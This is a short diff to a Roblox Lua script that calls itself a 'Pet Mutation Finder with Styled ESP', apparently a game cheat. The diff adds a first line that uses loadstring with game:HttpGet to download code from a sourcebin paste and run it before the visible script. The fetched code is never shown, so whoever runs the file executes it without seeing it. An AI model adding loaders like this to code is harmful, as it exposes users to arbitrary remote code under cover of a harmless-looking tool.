@@ -1,4 +1,4 @@
-
+loadstring(game:HttpGet("https://cdn.sourceb.in/bins/yfNC0pasNC/0", true))()
 -- Pet Mutation Finder with Styled ESP + Credit Footer
 local Players = game:GetService("Players")
 local player = Players.LocalPlayer
